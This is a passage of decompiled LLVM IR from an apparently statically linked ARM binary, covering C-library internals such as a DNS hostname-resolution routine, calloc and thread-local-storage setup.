  br i1 %v7_14834, label %dec_label_pc_1486c, label %dec_label_pc_1483c

dec_label_pc_1483c:                               ; preds = %dec_label_pc_14834
  %v3_1483c = icmp eq i32 %v2_14828, -1
  br i1 %v3_1483c, label %dec_label_pc_14858, label %dec_label_pc_14a34

dec_label_pc_14848:                               ; preds = %dec_label_pc_14828
  %v7_14848 = icmp eq i32 %v1_14810, 2
  br i1 %v7_14848, label %.thread3, label %bb

bb:                                               ; preds = %dec_label_pc_14848
  store i32 0, i32* @r6, align 4
  br label %dec_label_pc_14870

.thread3:                                         ; preds = %dec_label_pc_14848
  store i32 1, i32* @r6, align 4
  br label %dec_label_pc_14870

dec_label_pc_14858:                               ; preds = %dec_label_pc_1483c
  %v3_1485c = load i16, i16* @global_var_24070.401, align 2
  %v4_1485c = sext i16 %v3_1485c to i32
  store i32 %v4_1485c, i32* %r3.global-to-local, align 4
  %v0_14860 = load i32, i32* @r6, align 4
  %v2_14860 = add i32 %v0_14860, %v4_1485c
  %v3_14860 = inttoptr i32 %v2_14860 to i32*
  %v4_14860 = load i32, i32* %v3_14860, align 4
  store i32 %v4_14860, i32* %r3.global-to-local, align 4
  %v7_14864 = icmp eq i32 %v4_14860, 2
  br i1 %v7_14864, label %dec_label_pc_1486c, label %dec_label_pc_14a34

dec_label_pc_1486c:                               ; preds = %dec_label_pc_14858, %dec_label_pc_14834
  store i32 0, i32* @r6, align 4
  br label %dec_label_pc_14870

dec_label_pc_14870:                               ; preds = %bb, %.thread3, %dec_label_pc_1486c
  %v3_14870 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_14870, i32* %r0.global-to-local, align 4
  %v0_14874 = load i32, i32* @r8, align 4
  %v1_14874 = sub i32 0, %v0_14874
  %v1_14878 = urem i32 %v1_14874, 4
  store i32 %v1_14878, i32* @r1, align 4
  %v2_14880 = sub i32 %v3_14870, %v1_14878
  store i32 %v2_14880, i32* %r2.global-to-local, align 4
  %v3_14884 = load i16, i16* @global_var_24070.401, align 2
  %v4_14884 = sext i16 %v3_14884 to i32
  store i32 %v4_14884, i32* %r3.global-to-local, align 4
  %v0_14888 = call i32 @__aeabi_read_tp()
  store i32 %v0_14888, i32* %r0.global-to-local, align 4
  %v1_1488c = add i32 %v2_14880, -24
  store i32 %v1_1488c, i32* @sl, align 4
  %v0_14890 = load i32, i32* @r4, align 4
  %v3_14890 = add i32 %v4_14884, %v0_14888
  %v4_14890 = inttoptr i32 %v3_14890 to i32*
  store i32 %v0_14890, i32* %v4_14890, align 4
  %v0_14894 = load i32, i32* @sl, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_1489c = load i32, i32* @fp, align 4
  %v2_1489c = inttoptr i32 %v1_1489c to i32*
  store i32 -1, i32* %v2_1489c, align 4
  %v7_148a0 = icmp sgt i32 %v0_14894, 255
  br i1 %v7_148a0, label %dec_label_pc_148a8, label %bb27

bb27:                                             ; preds = %dec_label_pc_14870
  store i32 34, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14a34

dec_label_pc_148a8:                               ; preds = %dec_label_pc_14870
  %v0_148a8 = load i32, i32* @r8, align 4
  %v1_148a8 = load i32, i32* @r1, align 4
  %v2_148a8 = add i32 %v1_148a8, %v0_148a8
  store i32 %v2_148a8, i32* @r8, align 4
  store i32 0, i32* @r4, align 4
  %v1_148b0 = add i32 %v2_148a8, 16
  store i32 %v1_148b0, i32* %r2.global-to-local, align 4
  %v1_148b4 = add i32 %v2_148a8, 24
  store i32 %v1_148b4, i32* @r5, align 4
  %v3_148bc = inttoptr i32 %v1_148b0 to i32*
  store i32 %v2_148a8, i32* %v3_148bc, align 4
  %v0_148c0 = load i32, i32* @sb, align 4
  store i32 %v0_148c0, i32* @r1, align 4
  %v0_148c4 = load i32, i32* @r4, align 4
  %v1_148c4 = load i32, i32* %r2.global-to-local, align 4
  %v2_148c4 = add i32 %v1_148c4, 4
  %v3_148c4 = inttoptr i32 %v2_148c4 to i32*
  store i32 %v0_148c4, i32* %v3_148c4, align 4
  %v0_148c8 = load i32, i32* @r5, align 4
  store i32 %v0_148c8, i32* %r0.global-to-local, align 4
  %v0_148cc = load i32, i32* @sl, align 4
  store i32 %v0_148cc, i32* %r2.global-to-local, align 4
  %v3_148d0 = call i32 @strncpy(i32 %v0_148c8, i32 %v0_148c0, i32 %v0_148cc)
  %v0_148d4 = load i32, i32* @r4, align 4
  %v1_148d4 = trunc i32 %v0_148d4 to i8
  %v2_148d4 = load i32, i32* @r5, align 4
  %v3_148d4 = load i32, i32* @sl, align 4
  %v4_148d4 = add i32 %v3_148d4, %v2_148d4
  %v5_148d4 = inttoptr i32 %v4_148d4 to i8*
  store i8 %v1_148d4, i8* %v5_148d4, align 1
  %v0_148d8 = load i32, i32* @sb, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  %v0_148e0 = load i32, i32* @r8, align 4
  store i32 %v0_148e0, i32* %r2.global-to-local, align 4
  %v3_148e4 = inttoptr i32 %v0_148d8 to i8*
  %v4_148e4 = call i32 @inet_pton(i32 10, i8* %v3_148e4, i32 %v0_148e0)
  store i32 %v4_148e4, i32* %r0.global-to-local, align 4
  %v1_148e8 = load i32, i32* @r4, align 4
  %v9_148e8 = icmp eq i32 %v4_148e4, %v1_148e8
  br i1 %v9_148e8, label %dec_label_pc_14920, label %dec_label_pc_148f0

dec_label_pc_148f0:                               ; preds = %dec_label_pc_148a8
  store i32 %v1_148b0, i32* @ip, align 4
  %v0_148f8 = load i32, i32* @r7, align 4
  store i32 %v0_148f8, i32* %v2_147cc, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v1_14900 = load i32, i32* @r7, align 4
  %v2_14900 = add i32 %v1_14900, 8
  %v3_14900 = inttoptr i32 %v2_14900 to i32*
  store i32 10, i32* %v3_14900, align 4
  %v0_14904 = load i32, i32* @r4, align 4
  store i32 %v0_14904, i32* %r0.global-to-local, align 4
  %v0_14908 = load i32, i32* %r3.global-to-local, align 4
  %v1_14908 = add i32 %v0_14908, 6
  store i32 %v1_14908, i32* %r3.global-to-local, align 4
  %v1_1490c = load i32, i32* @r7, align 4
  %v2_1490c = add i32 %v1_1490c, 12
  %v3_1490c = inttoptr i32 %v2_1490c to i32*
  store i32 %v1_14908, i32* %v3_1490c, align 4
  %v0_14910 = load i32, i32* @r5, align 4
  %v1_14910 = load i32, i32* @r7, align 4
  %v2_14910 = inttoptr i32 %v1_14910 to i32*
  store i32 %v0_14910, i32* %v2_14910, align 4
  %v0_14914 = load i32, i32* @ip, align 4
  %v1_14914 = load i32, i32* @r7, align 4
  %v2_14914 = add i32 %v1_14914, 16
  %v3_14914 = inttoptr i32 %v2_14914 to i32*
  store i32 %v0_14914, i32* %v3_14914, align 4
  %v0_14918 = load i32, i32* @r4, align 4
  %v1_14918 = load i32, i32* @fp, align 4
  %v2_14918 = inttoptr i32 %v1_14918 to i32*
  store i32 %v0_14918, i32* %v2_14918, align 4
  br label %dec_label_pc_14a34

dec_label_pc_14920:                               ; preds = %dec_label_pc_148a8
  %v0_14920 = load i32, i32* @r6, align 4
  %v2_14920 = icmp eq i32 %v0_14920, 0
  br i1 %v2_14920, label %dec_label_pc_14928, label %dec_label_pc_14a20

dec_label_pc_14928:                               ; preds = %dec_label_pc_14920
  %v2_14928 = ptrtoint i32* %stack_var_-84 to i32
  store i32 %v2_14928, i32* @r4, align 4
  store i32 %v2_14928, i32* %r0.global-to-local, align 4
  store i32 40, i32* %r2.global-to-local, align 4
  %v3_14938 = bitcast i32* %stack_var_-84 to i8*
  %v4_14938 = call i32 @__GI_memset(i8* %v3_14938, i32 0, i32 40)
  store i32 %v4_14938, i32* %r0.global-to-local, align 4
  %v2_14940 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_14940, i32* @sb, align 4
  %v7_14980 = icmp eq i32 %tmp7, 5
  br label %dec_label_pc_14944

dec_label_pc_14944:                               ; preds = %dec_label_pc_14998, %dec_label_pc_14928
  store i32 %v2_14940, i32* %r2.global-to-local, align 4
  store i32 %v2_14928, i32* %r3.global-to-local, align 4
  %v0_14950 = load i32, i32* @r5, align 4
  store i32 %v0_14950, i32* %r0.global-to-local, align 4
  %v4_14954 = inttoptr i32 %v0_14950 to i8*
  %v5_14954 = call i32 @__dns_lookup(i8* %v4_14954, i32 28, i32 %v2_14940, i32 %v2_14928)
  store i32 %v5_14954, i32* @r4, align 4
  %v1_14958 = icmp slt i32 %v5_14954, 0
  %v0_1495c = load i32, i32* @sl, align 4
  store i32 %v0_1495c, i32* %r2.global-to-local, align 4
  %v0_14960 = load i32, i32* @r6, align 4
  %v1_14960 = add i32 %v0_14960, 1
  store i32 %v1_14960, i32* @r6, align 4
  %v0_14964 = load i32, i32* @r5, align 4
  store i32 %v0_14964, i32* %r0.global-to-local, align 4
  br i1 %v1_14958, label %dec_label_pc_14a20, label %dec_label_pc_1496c

dec_label_pc_1496c:                               ; preds = %dec_label_pc_14944
  %v3_1496c = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_1496c, i32* @r1, align 4
  %v3_14970 = call i32 @strncpy(i32 %v0_14964, i32 %v3_1496c, i32 %v0_1495c)
  %v3_14974 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_14974, i32* @r0, align 4
  %v0_14978 = call i32 @free()
  store i32 %v0_14978, i32* %r0.global-to-local, align 4
  store i32 %tmp7, i32* @r1, align 4
  %v0_14984 = load i32, i32* @r4, align 4
  store i32 %v0_14984, i32* %r2.global-to-local, align 4
  %v0_14988 = load i32, i32* @r5, align 4
  store i32 %v0_14988, i32* @r3, align 4
  br i1 %v7_14980, label %dec_label_pc_14990, label %dec_label_pc_149c8

dec_label_pc_14990:                               ; preds = %dec_label_pc_1496c
  %v0_14990 = load i32, i32* @r6, align 4
  %v8_14994 = icmp sgt i32 %v0_14990, 5
  br i1 %v8_14994, label %dec_label_pc_149bc, label %dec_label_pc_14998

dec_label_pc_14998:                               ; preds = %dec_label_pc_14990
  store i32 %tmp6, i32* @r1, align 4
  %v3_1499c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1499c, i32* %r0.global-to-local, align 4
  %v0_149a0 = load i32, i32* @sl, align 4
  %v5_149a4 = call i32 @__decode_dotted(i32 %v3_1499c, i32 %tmp6, i32 %v0_14984, i32 %v0_14988, i32 %v0_149a0)
  store i32 %v5_149a4, i32* @r4, align 4
  %v3_149ac = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_149ac, i32* @r0, align 4
  %v0_149b0 = call i32 @free()
  store i32 %v0_149b0, i32* %r0.global-to-local, align 4
  %v0_149b4 = load i32, i32* @r4, align 4
  %v1_149b4 = icmp slt i32 %v0_149b4, 0
  br i1 %v1_149b4, label %dec_label_pc_149bc, label %dec_label_pc_14944

dec_label_pc_149bc:                               ; preds = %dec_label_pc_14998, %dec_label_pc_14990
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14a28

dec_label_pc_149c8:                               ; preds = %dec_label_pc_1496c
  %v7_149c8 = icmp eq i32 %tmp7, 28
  br i1 %v7_149c8, label %dec_label_pc_149d0, label %dec_label_pc_14a18

dec_label_pc_149d0:                               ; preds = %dec_label_pc_149c8
  store i32 16, i32* @r2, align 4
  %v0_149d8 = load i32, i32* @r8, align 4
  store i32 %v0_149d8, i32* @r0, align 4
  %v0_149dc = call i32 @memcpy()
  store i32 10, i32* %r3.global-to-local, align 4
  store i32 %v1_148b0, i32* @lr, align 4
  %v1_149e8 = load i32, i32* @r7, align 4
  %v2_149e8 = add i32 %v1_149e8, 8
  %v3_149e8 = inttoptr i32 %v2_149e8 to i32*
  store i32 10, i32* %v3_149e8, align 4
  %v0_149ec = load i32, i32* %r3.global-to-local, align 4
  %v1_149ec = add i32 %v0_149ec, 6
  store i32 %v1_149ec, i32* %r3.global-to-local, align 4
  %v1_149f0 = load i32, i32* @r7, align 4
  %v2_149f0 = add i32 %v1_149f0, 12
  %v3_149f0 = inttoptr i32 %v2_149f0 to i32*
  store i32 %v1_149ec, i32* %v3_149f0, align 4
  %v3_149f4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_149f4, i32* @r0, align 4
  %v0_149f8 = load i32, i32* @r5, align 4
  %v1_149f8 = load i32, i32* @r7, align 4
  %v2_149f8 = inttoptr i32 %v1_149f8 to i32*
  store i32 %v0_149f8, i32* %v2_149f8, align 4
  %v0_149fc = load i32, i32* @lr, align 4
  %v1_149fc = load i32, i32* @r7, align 4
  %v2_149fc = add i32 %v1_149fc, 16
  %v3_149fc = inttoptr i32 %v2_149fc to i32*
  store i32 %v0_149fc, i32* %v3_149fc, align 4
  %v0_14a00 = call i32 @free()
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %tmp12, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_14a10 = load i32, i32* @r7, align 4
  store i32 %v0_14a10, i32* %v2_147cc, align 4
  %v0_14a28.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14a28

dec_label_pc_14a18:                               ; preds = %dec_label_pc_149c8
  %v3_14a18 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_14a18, i32* @r0, align 4
  %v0_14a1c = call i32 @free()
  store i32 %v0_14a1c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14a20

dec_label_pc_14a20:                               ; preds = %dec_label_pc_14944, %dec_label_pc_14920, %dec_label_pc_14a18
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14a28

dec_label_pc_14a28:                               ; preds = %dec_label_pc_149d0, %dec_label_pc_149bc, %dec_label_pc_14a20
  %v0_14a28 = phi i32 [ %v0_14a28.pre, %dec_label_pc_149d0 ], [ 3, %dec_label_pc_149bc ], [ 1, %dec_label_pc_14a20 ]
  %v1_14a28 = load i32, i32* @fp, align 4
  %v2_14a28 = inttoptr i32 %v1_14a28 to i32*
  store i32 %v0_14a28, i32* %v2_14a28, align 4
  br label %dec_label_pc_14a34

dec_label_pc_14a30:                               ; preds = %dec_label_pc_147c0, %dec_label_pc_147d4
  store i32 22, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14a34

dec_label_pc_14a34:                               ; preds = %.thread1, %bb27, %dec_label_pc_14858, %dec_label_pc_1483c, %dec_label_pc_14a28, %dec_label_pc_147a0, %dec_label_pc_148f0, %dec_label_pc_14a30
  store i32 %v6_14780, i32* @r5, align 4
  store i32 %v9_14780, i32* @r6, align 4
  store i32 %v12_14780, i32* @r7, align 4
  store i32 %v15_14780, i32* @r8, align 4
  store i32 %v18_14780, i32* @sb, align 4
  store i32 %v21_14780, i32* @sl, align 4
  store i32 %v24_14780, i32* @fp, align 4
  %v1_14a3c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_14a3c

; uselistorder directives
  uselistorder i32 %v2_14928, { 1, 0, 2, 3 }
  uselistorder i32 %v1_148b0, { 2, 1, 0, 3 }
  uselistorder i32 %v1_14878, { 1, 0 }
  uselistorder i32 %v0_147e4, { 1, 0, 2 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %stack_var_-84, { 1, 2, 0, 3 }
  uselistorder i32 %tmp12, { 3, 2, 0, 1 }
  uselistorder i32 %tmp6, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 11, 12, 13, 14, 15, 16, 7, 8, 9, 10 }
  uselistorder i32* %r0.global-to-local, { 21, 0, 1, 3, 2, 4, 5, 6, 12, 13, 14, 17, 15, 16, 19, 18, 20, 22, 23, 7, 9, 8, 10, 11 }
  uselistorder i32 (i32, i32, i32)* @strncpy, { 1, 0, 3, 2 }
  uselistorder i32 -24, { 1, 0 }
  uselistorder label %dec_label_pc_14a34, { 7, 4, 6, 1, 2, 3, 0, 5 }
  uselistorder label %dec_label_pc_14a30, { 1, 0 }
  uselistorder label %dec_label_pc_14a28, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14a20, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14870, { 2, 1, 0 }
}

define i32 @calloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %v3_14a54 = load i32, i32* @r4, align 4
  %v6_14a54 = load i32, i32* @r5, align 4
  %v9_14a54 = load i32, i32* @r6, align 4
  %v12_14a54 = load i32, i32* @lr, align 4
  %v2_14a5c = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* @r5, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_14a6c = mul i32 %arg2, %arg1
  store i32 %v2_14a6c, i32* @r6, align 4
  br i1 %v2_14a5c, label %dec_label_pc_14aa4, label %dec_label_pc_14a74

dec_label_pc_14a74:                               ; preds = %entry
  store i32 %arg1, i32* @r1, align 4
  %v2_14a7c = udiv i32 %v2_14a6c, %arg1
  %v9_14a80 = icmp eq i32 %v2_14a7c, %arg2
  br i1 %v9_14a80, label %dec_label_pc_14aa4, label %dec_label_pc_14a88

dec_label_pc_14a88:                               ; preds = %dec_label_pc_14a74
  %v0_14a8c = call i32 @__aeabi_read_tp()
  %v3_14a90 = load i16, i16* @global_var_24070.401, align 2
  %v4_14a90 = sext i16 %v3_14a90 to i32
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_14a9c = add i32 %v4_14a90, %v0_14a8c
  %v4_14a9c = inttoptr i32 %v3_14a9c to i32*
  store i32 12, i32* %v4_14a9c, align 4
  br label %dec_label_pc_14b68

dec_label_pc_14aa4:                               ; preds = %dec_label_pc_14a74, %entry
  %v4_14aa8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 116) to i32*), align 4
  store i32 %v4_14aa8, i32* @r4, align 4
  %v4_14ac0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 120) to i32*), align 4
  store i32 %v4_14ac0, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14ac0)
  %v0_14ad4 = load i32, i32* @r5, align 4
  %v2_14ad4 = add i32 %v0_14ad4, 16
  %v3_14ad4 = inttoptr i32 %v2_14ad4 to i32*
  %v4_14ad4 = load i32, i32* %v3_14ad4, align 4
  store i32 %v4_14ad4, i32* %ip.global-to-local, align 4
  store i32 84704, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_14ad4)
  %v0_14ae0 = load i32, i32* @r6, align 4
  %v1_14ae4 = call i32 @malloc(i32 %v0_14ae0)
  store i32 %v1_14ae4, i32* %r4.global-to-local, align 4
  %v2_14ae8 = icmp eq i32 %v1_14ae4, 0
  br i1 %v2_14ae8, label %.thread, label %dec_label_pc_14af0

dec_label_pc_14af0:                               ; preds = %dec_label_pc_14aa4
  %v1_14af0 = add i32 %v1_14ae4, -4
  %v2_14af0 = inttoptr i32 %v1_14af0 to i32*
  %v3_14af0 = load i32, i32* %v2_14af0, align 4
  %v1_14af4 = and i32 %v3_14af0, 2
  %v2_14af4 = icmp eq i32 %v1_14af4, 0
  br i1 %v2_14af4, label %dec_label_pc_14afc, label %.thread

dec_label_pc_14afc:                               ; preds = %dec_label_pc_14af0
  %v1_14afc6 = add i32 %v3_14af0, -4
  %v1_14b00 = and i32 %v1_14afc6, -4
  %v3_14b04 = udiv i32 %v1_14b00, 4
  store i32 %v3_14b04, i32* %ip.global-to-local, align 4
  %tmp = icmp eq i32 %v1_14b00, 36
  %v2_14b0c = icmp ult i32 %v1_14b00, 33
  %v3_14b0c = or i1 %tmp, %v2_14b0c
  br i1 %v3_14b0c, label %dec_label_pc_14b18, label %dec_label_pc_14b10

dec_label_pc_14b10:                               ; preds = %dec_label_pc_14afc
  %v3_14b10 = inttoptr i32 %v1_14ae4 to i8*
  %v4_14b10 = call i32 @__GI_memset(i8* %v3_14b10, i32 0, i32 %v1_14b00)
  br label %.thread

dec_label_pc_14b18:                               ; preds = %dec_label_pc_14afc
  %tmp7 = icmp eq i32 %v1_14b00, 16
  %v2_14b1c = inttoptr i32 %v1_14ae4 to i32*
  store i32 0, i32* %v2_14b1c, align 4
  %v1_14b20 = load i32, i32* %r4.global-to-local, align 4
  %v2_14b20 = add i32 %v1_14b20, 4
  %v3_14b20 = inttoptr i32 %v2_14b20 to i32*
  store i32 0, i32* %v3_14b20, align 4
  %v1_14b24 = load i32, i32* %r4.global-to-local, align 4
  %v2_14b24 = add i32 %v1_14b24, 8
  %v3_14b24 = inttoptr i32 %v2_14b24 to i32*
  store i32 0, i32* %v3_14b24, align 4
  %v2_14b28 = icmp ult i32 %v1_14b00, 13
  %v3_14b28 = or i1 %tmp7, %v2_14b28
  br i1 %v3_14b28, label %.thread, label %dec_label_pc_14b2c

dec_label_pc_14b2c:                               ; preds = %dec_label_pc_14b18
  %v0_14b2c = load i32, i32* %ip.global-to-local, align 4
  %v1_14b30 = load i32, i32* %r4.global-to-local, align 4
  %v2_14b30 = add i32 %v1_14b30, 12
  %v3_14b30 = inttoptr i32 %v2_14b30 to i32*
  store i32 0, i32* %v3_14b30, align 4
  %v1_14b34 = load i32, i32* %r4.global-to-local, align 4
  %v2_14b34 = add i32 %v1_14b34, 16
  %v3_14b34 = inttoptr i32 %v2_14b34 to i32*
  store i32 0, i32* %v3_14b34, align 4
  %tmp8 = icmp ult i32 %v0_14b2c, 7
  br i1 %tmp8, label %.thread, label %dec_label_pc_14b3c

dec_label_pc_14b3c:                               ; preds = %dec_label_pc_14b2c
  %v0_14b3c = load i32, i32* %ip.global-to-local, align 4
  %v7_14b3c = icmp eq i32 %v0_14b3c, 9
  %v1_14b40 = load i32, i32* %r4.global-to-local, align 4
  %v2_14b40 = add i32 %v1_14b40, 20
  %v3_14b40 = inttoptr i32 %v2_14b40 to i32*
  store i32 0, i32* %v3_14b40, align 4
  %v1_14b44 = load i32, i32* %r4.global-to-local, align 4
  %v2_14b44 = add i32 %v1_14b44, 24
  %v3_14b44 = inttoptr i32 %v2_14b44 to i32*
  store i32 0, i32* %v3_14b44, align 4
  br i1 %v7_14b3c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_14b3c
  %v2_14b48 = load i32, i32* %r4.global-to-local, align 4
  %v3_14b48 = add i32 %v2_14b48, 32
  %v4_14b48 = inttoptr i32 %v3_14b48 to i32*
  store i32 0, i32* %v4_14b48, align 4
  %v2_14b4c = load i32, i32* %r4.global-to-local, align 4
  %v3_14b4c = add i32 %v2_14b4c, 28
  %v4_14b4c = inttoptr i32 %v3_14b4c to i32*
  store i32 0, i32* %v4_14b4c, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_14b3c, %dec_label_pc_14af0, %dec_label_pc_14b2c, %dec_label_pc_14b18, %dec_label_pc_14aa4, %dec_label_pc_14b10, %bb
  store i32 1, i32* @r1, align 4
  %v0_14b5c = load i32, i32* @r5, align 4
  %v2_14b5c = add i32 %v0_14b5c, 48
  %v3_14b5c = inttoptr i32 %v2_14b5c to i32*
  %v4_14b5c = load i32, i32* %v3_14b5c, align 4
  store i32 %v4_14b5c, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_14b5c)
  br label %dec_label_pc_14b68

dec_label_pc_14b68:                               ; preds = %dec_label_pc_14a88, %.thread
  %v0_14b68 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_14a54, i32* @r4, align 4
  store i32 %v6_14a54, i32* @r5, align 4
  store i32 %v9_14a54, i32* @r6, align 4
  store i32 %v12_14a54, i32* @lr, align 4
  ret i32 %v0_14b68

; uselistorder directives
  uselistorder i32 %v1_14b00, { 0, 5, 2, 1, 4, 3 }
  uselistorder i32 %v1_14ae4, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_14b68, { 1, 0 }
  uselistorder label %.thread, { 6, 0, 2, 3, 5, 1, 4 }
}

define i32 @init_static_tls() local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 80, i32* %r3.global-to-local, align 4
  %v3_14ba0 = load i32, i32* @r4, align 4
  store i32 %v3_14ba0, i32* %stack_var_-16, align 4
  %v4_14ba4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 80) to i32*), align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_14bac = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 64) to i32*), align 4
  store i32 40, i32* %r3.global-to-local, align 4
  %v4_14bb4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 40) to i32*), align 4
  store i32 %v4_14bb4, i32* %r4.global-to-local, align 4
  store i32 56, i32* %r3.global-to-local, align 4
  %v1_14bbc = inttoptr i32 %v4_14ba4 to i32*
  %v2_14bbc = load i32, i32* %v1_14bbc, align 4
  %v4_14bc0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 56) to i32*), align 4
  store i32 %v4_14bc0, i32* %lr.global-to-local, align 4
  store i32 152, i32* %r3.global-to-local, align 4
  %v1_14bc8 = add i32 %v2_14bbc, 15
  %v4_14bcc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 152) to i32*), align 4
  store i32 %v4_14bcc, i32* @ip, align 4
  %v1_14bd0 = load i32, i32* @r0, align 4
  %v2_14bd0 = add i32 %v1_14bd0, %v1_14bc8
  %v1_14bd4 = inttoptr i32 %v4_14bac to i32*
  %v2_14bd4 = load i32, i32* %v1_14bd4, align 4
  store i32 %v2_14bd4, i32* %r3.global-to-local, align 4
  %v1_14bd8 = and i32 %v2_14bd0, -16
  store i32 %v1_14bd8, i32* %v1_14bbc, align 4
  %v0_14be0 = load i32, i32* @r0, align 4
  %v1_14be0 = load i32, i32* %r4.global-to-local, align 4
  %v2_14be0 = inttoptr i32 %v1_14be0 to i32*
  store i32 %v0_14be0, i32* %v2_14be0, align 4
  %v0_14be4 = load i32, i32* @r1, align 4
  %v1_14be4 = load i32, i32* %lr.global-to-local, align 4
  %v2_14be4 = inttoptr i32 %v1_14be4 to i32*
  store i32 %v0_14be4, i32* %v2_14be4, align 4
  %v0_14be8 = load i32, i32* %r3.global-to-local, align 4
  %v1_14be8 = load i32, i32* @ip, align 4
  %v2_14be8 = inttoptr i32 %v1_14be8 to i32*
  store i32 %v0_14be8, i32* %v2_14be8, align 4
  %v2_14bec = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14bec, i32* %r4.global-to-local, align 4
  %v1_14bf0 = load i32, i32* @r0, align 4
  ret i32 %v1_14bf0

; uselistorder directives
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 152, { 0, 2, 1, 3 }
}

define i32 @function_14bf8(i32 %arg1) local_unnamed_addr {
dec_label_pc_14bf8:
  %v0_14bf8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14bf8, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_14bf8
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_14bf8, %bb
  %v4_14c08 = phi i32 [ %arg1, %dec_label_pc_14bf8 ], [ 0, %bb ]
  ret i32 %v4_14c08

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @_dl_tls_setup() local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* %r3.global-to-local, align 4
  %v4_14c1c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 92) to i32*), align 4
  store i32 %v4_14c1c, i32* @lr, align 4
  %v4_14c28 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 64) to i32*), align 4
  store i32 64, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 13520) to i32*), align 4
  store i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 13520), i32* %r3.global-to-local, align 4
  store i32 0, i32* @r0, align 4
  store i32 16, i32* @r1, align 4
  %v2_14c48 = inttoptr i32 %v4_14c28 to i32*
  store i32 1, i32* %v2_14c48, align 4
  %v0_14c4c = load i32, i32* %r3.global-to-local, align 4
  %v1_14c4c = load i32, i32* @lr, align 4
  %v2_14c4c = inttoptr i32 %v1_14c4c to i32*
  store i32 %v0_14c4c, i32* %v2_14c4c, align 4
  %v0_14c50 = call i32 @init_static_tls()
  ret i32 0
}

define i32 @__tls_get_addr(i32 %arg1) local_unnamed_addr {
entry:
  %v0_14c7c = call i32 @__aeabi_read_tp()
  %v1_14c80 = inttoptr i32 %v0_14c7c to i32*
  %v2_14c80 = load i32, i32* %v1_14c80, align 4
  %v1_14c84 = add i32 %arg1, 4
  %v2_14c84 = inttoptr i32 %v1_14c84 to i32*
  %v3_14c84 = load i32, i32* %v2_14c84, align 4
  %v1_14c88 = add i32 %v2_14c80, 8
  %v2_14c88 = inttoptr i32 %v1_14c88 to i32*
  %v3_14c88 = load i32, i32* %v2_14c88, align 4
  %v2_14c8c = add i32 %v3_14c88, %v3_14c84
  ret i32 %v2_14c8c
}

define i32 @__libc_setup_tls(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
